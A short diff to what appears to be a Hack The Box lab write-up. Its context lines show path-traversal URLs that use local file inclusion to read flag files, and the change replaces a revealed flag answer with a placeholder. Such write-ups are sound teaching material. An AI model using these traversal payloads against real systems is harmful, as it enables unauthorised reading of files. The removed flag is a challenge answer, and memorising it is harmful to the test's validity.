@@ -247,7 +247,7 @@ http://94.237.60.55:55141/index.php?language=../../../../home/flag.txt
 http://94.237.60.55:55141/index.php?language=../../../../usr/share/flags/flag.txt
 ```
 
-**Answer:** `HTB{n3v3r_tru$t_u$3r_!nput}`
+**Answer:** `HTB{...}`
 
 ---
 
